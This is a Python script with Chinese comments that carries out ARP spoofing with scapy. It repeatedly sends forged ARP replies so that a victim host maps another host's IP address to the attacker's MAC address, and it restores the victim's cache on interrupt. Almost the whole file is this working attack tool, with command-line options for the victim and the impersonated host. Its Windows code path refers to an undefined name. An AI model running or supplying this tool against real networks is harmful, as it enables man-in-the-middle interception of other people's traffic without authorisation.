#!/usr/bin/env python3
# -*- encoding = utf-8 -*-
# 该代码由本人学习时编写，仅供自娱自乐！
# 本人QQ：1945962391 
# 欢迎留言讨论，共同学习进步！

import signal
import sys
from netifaces import ifaddresses, AF_INET, AF_INET6
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import sr1, sendp
import netifaces as ni
import platform
import netifaces
import time


def get_connection_name_from_guid(iface_guids):  # 获取接口名称
    if platform.system() == "Windows":
        import winreg as wr
        # 产生接口名字清单,默认全部填写上'(unknown)'
        iface_names = ['(unknown)' for i in range(len(iface_guids))]
        # 打开"HKEY_LOCAL_MACHINE"
        reg = wr.ConnectRegistry(None, wr.HKEY_LOCAL_MACHINE)
        # 打开r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}'
        #
        reg_key = wr.OpenKey(reg, r'SYSTEM\CurrentControlSet\Control\Network\{4d36e972-e325-11ce-bfc1-08002be10318}')
        for i in range(len(iface_guids)):
            try:
                # 尝试读取每一个接口ID下对应的Name
                reg_subkey = wr.OpenKey(reg_key, iface_guids[i] + r'\Connection')
                # 如果存在Name,就按照顺序写入iface_names
                iface_names[i] = wr.QueryValueEx(reg_subkey, 'Name')[0]
            except FileNotFoundError:
                pass
        # 把iface_guids, iface_names 压在一起返回
        return zip(iface_guids, iface_names)


def get_ifname(ifname):
    if platform.system() == "Linux":
        return ifname
    elif platform.system() == "Windows":
        import winreg as wr
        x = ni.interfaces()
        for i in get_connection_name_from_guid(x):
            # 找到名字所对应的接口ID并返回
            if i[1] == ifname:
                return i[0]
    else:
        print('操作系统不支持,本脚本只能工作在Windows或者Linux环境!')


def get_mac_address(ifname):  # 获取接口MAC地址
    return netifaces.ifaddresses(get_ifname(ifname))[netifaces.AF_LINK][0]['addr']


def get_ip_address(ifname):  # 获取接口ip地址
    return ifaddresses(get_ifname(ifname))[AF_INET][0]['addr']


def get_ipv6_address(ifname):  # 获取接口ipv6地址
    return ifaddresses(get_ifname(ifname))[AF_INET6][0]['addr']


def scapy_iface(os_name):
    if platform.system() == "Linux":
        return os_name
    elif platform.system() == "Windows":
        for x, y in ifaces.items():
            if y.pcap_name is not None:
                if get_ifname(os_name) == ('{' + y.pcap_name.split('{')[1]):
                    return x
                else:
                    pass


def arp_request(dst, ifname):  # 构建arp请求函数
    hwsrc = get_mac_address(ifname)
    psrc = get_ip_address(ifname)
    try:
        arp_pkt = sr1(ARP(op=1, hwsrc=hwsrc, psrc=psrc, pdst=dst), timeout=5, verbose=False)
        return dst, arp_pkt.getlayer(ARP).fields['hwsrc']
    except AttributeError:
        return dst, None


def arp_spoof(dst, src, ifname):  # 定义毒化方法，毒化dst，使dst相信src的mac地址是本机的mac地址
    global psrc, hwsrc, mac_src, hwdst, src1, dst1, ifname1  # 声明全局变量，为后续函数使用方便
    src1 = src  # 为全局变量赋值，src1为被毒化主机地址
    dst1 = dst  # dst1为被攻击对象的主机地址
    ifname1 = ifname  # 攻击使用的接口名字
    psrc = get_ip_address(ifname)  # 通过之前编写的方法获取本地ip地址
    hwsrc = get_mac_address(ifname)  # 获取本地mac地址
    mac_src = arp_request(dst, ifname)[-1]  # 获取被攻击主机的真实mac地址
    hwdst = arp_request(src, ifname)[-1]  # 获取被毒化主机的真实mac地址
    signal.signal(signal.SIGINT, sigint_handler)  # 信号处理，接收到ctrl+c后执行sigint_handler方法
    while True:
        sendp(Ether(src=hwsrc, dst=mac_src) / ARP(op=2, hwsrc=hwsrc, psrc=src1, hwdst=mac_src, pdst=dst1),
              iface=scapy_iface(ifname1), verbose=False)
        # sendp方法发送二层数据包，源mac地址为本地mac，目的地址为被攻击主机的mac地址，arp数据包中，选项为2（reply），
        # 源mac地址为本地mac地址，源ip地址为被毒化主机的ip地址，起到毒化效果，目的mac地址与目的ip地址均为被攻击主机mac及ip地址
        # 如果采用dst为二层广播，会造成被伪装设备告警地址重叠(免费arp的效果)，并且欺骗效果不稳定，容易抖动！
    # pkt.show()
        print("发送ARP欺骗数据包！欺骗" + dst + ',本机MAC地址为' + hwsrc + '的MAC地址！！！')
        time.sleep(1)


def sigint_handler(signum, frame):  # 定义处理方法
    global psrc, hwsrc, mac_src, hwdst, src1, dst1  # 引入全局变量
    print("\n执行恢复操作！！！")
    # 发送ARP数据包，恢复被毒化设备的ARP缓存
    sendp(Ether(src=hwsrc, dst=mac_src) / ARP(op=2, hwsrc=hwdst, hwdst=mac_src, psrc=src1, pdst=dst1),
          iface=scapy_iface(ifname1),
          verbose=False)
    time.sleep(1)
    print("已经恢复 " + src1 + " ARP缓存")
    # 退出程序，跳出while True
    sys.exit()


def qyt_argparse(host, filename, iface):
    print(host)
    print(filename)
    print(iface)


if __name__ == '__main__':
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument("-d", "--dst", dest="dst", help="被攻击者的IP地址", default='127.0.0.1', type=str)
    parser.add_argument("-s", "--src", dest="src", help="需要伪装的IP地址", default='127.0.0.1', type=str)
    parser.add_argument("-i", "--inter", dest="ifname", help="指定本地接口", default='ens33', type=str)
    args = parser.parse_args()
    arp_spoof(args.dst, args.src, args.ifname)  # 攻击dst主机，使其相信src的mac地址为本地接口的mac地址



